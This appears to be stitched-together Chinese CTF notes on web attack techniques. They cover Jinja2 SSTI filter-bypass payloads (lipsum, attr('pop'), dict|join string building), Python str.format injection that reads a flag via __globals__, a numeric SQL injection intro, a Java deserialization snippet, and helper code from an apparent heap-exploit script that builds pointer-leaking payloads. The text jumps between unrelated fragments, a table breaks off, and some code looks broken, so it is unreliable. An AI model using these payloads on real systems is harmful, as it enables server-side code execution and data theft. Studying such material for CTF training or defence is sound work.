简单测测，过滤器确实可行

```
{% set org = ({ }|select()|string()) %}{{org}}
```

1. { }**： 首先创建了一个空的**字典（Dictionary）**。
2. **| select()**： 这是最关键的一步。`select()`是一个Jinja2**过滤器**，它通常需要配合一个测试条件（Test）来使用，例如 `| select(condition)`，用于从序列中筛选出满足条件的元素。当你**不提供任何条件**直接使用 `| select()`时，它会尝试将前面的对象（这里的空字典）转换成一个**生成器（Generator）**。这个生成器本身并不包含有效数据，但它是存在的
3. **| string()**： 这个过滤器将上一步得到的生成器对象转换为它的**字符串表示形式**。在Python中，一个对象的字符串表示通常会包含其**类型信息和在内存中的地址**`0x7f8c0d4c6fa0`
4. {% set org = ... %}**： 将最终得到的字符串赋值给变量 `org`。
5. **{{org}}**： 将变量 `org`的值渲染输出到页面上。

代码执行后，最终输出的内容看起来会类似于：`<generator object select_or_reject at 0x7f8c0d4c6fa0>`

```

这里使用了Jinja2模板语法。

{% ... %}是控制块，用于执行语句，如设置变量。

lipsum是Flask中的一个内置函数，通常用于生成随机文本。在SSTI上下文中，它常被用来访问全局变量，如lipsum.__globals__。

(lipsum|string|list)：这是过滤器的链式调用：

lipsum被传递给 string过滤器，将其转换为字符串。

然后 |list将字符串转换为字符列表。

|attr(Pop)(24)：attr过滤器用于获取属性。这里，Pop可能是一个字符串，表示属性名"pop"。attr("pop")相当于调用列表的 pop方法。

pop方法从列表中移除并返回指定索引的元素。索引是24。

所以，(lipsum|string|list)产生一个字符列表，然后调用 pop(24)来获取索引24处的字符。

```

{% set po=dict(po=1,p=2)|join()%}  # po = "pop"
```

🔍 代码执行过程解析

这行代码的执行可以分为三个关键步骤来理解：

1. 字典创建：`dict(po=1, p=2)`创建了一个包含两个键值对的字典：`{'po': 1, 'p': 2}`。
2. **join过滤器的默认行为**：当 `join`过滤器被应用于一个字典（`dict`对象）时，它默认操作的是字典的**键（keys）**，而不是值（values）。所以，它处理的对象是键的集合 `['po', 'p']`
3. **拼接成字符串**：`join()`在没有指定参数时，默认使用空字符串 `''`作为连接符。因此，它将列表 `['po', 'p']``'po' + '' + 'p'``"pop"`。

    private void readObject(java.io.ObjectInputStream s)
            throws Exception{
        String data = (String) s.readObject();
        Field[] fields = this.getClass().getFields();
        if (StringUtils.countOccurrencesOf(data, User.separator) != fields.length-2){
            throw new Exception(String.format("`%s` is the separator of the split method, the number of `%s` occurrences must be "+(fields.length-2),User.separator,User.separator));
        }
        String[] splits = data.split(User.separator);

        for (int i = 1; i < fields.length; i++) {
            if(fields[i].getType().getName().equals("int")){
                fields[i].set(this,Integer.parseInt(splits[i-1]));
            }else{
                fields[i].set(this,splits[i-1]);
            }
        }
        this.hash = (String) s.readObject();
        if (StringUtils.countOccurrencesOf(this.hash, User.separator) != 0){
            throw new Exception("hash cont content O.o");
        }
    }
    private void writeObject(ObjectOutputStream os)
            throws Exception{
        Field[] fields = this.getClass().getFields();
        ArrayList<String> datas = new ArrayList<>();
        for (int i = 1; i < fields.length; i++) {
            if(fields[i].getType().getName().equals("int")){
                datas.add(String.valueOf(fields[i].get(this)));
            }else{
                datas.add(fields[i].get(this).toString());
            }
        }
        os.writeObject(String.join(User.separator,datas));
        os.writeObject(String.join("-",datas));
    }
}

数字型SQL注入是指**后端SQL语句中数字参数未做安全处理**，直接拼接到查询中，导致攻击者可通过构造数字型Payload篡改SQL逻辑

| 特征            | 数字型注入                                  | 字符型注入                                                   |

str.format() 是 Python 内置的字符串格式化方法，它的核心行为是：扫描整个字符串中所有以 {} 包裹的占位符，然后按照规则用传入的参数去匹配并替换这些占位符，而不是只处理 “预先写死” 的占位符。
基础规则：
format 支持多种占位符形式，核心包括：
位置占位符：{0}、{1} → 对应 format 第 0、1 个参数（{0}就是第一个参数）；

全局变量占位符：{变量名} → 直接读取当前作用域中的同名变量；
嵌套占位符：{0.__class__.__globals__['flag']} → 逐层读取对象的类、类的全局变量，最终拿到flag。
关键特点：format 会处理字符串中所有的{}，不管这些{}是开发者写的，还是用户传入的。

def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
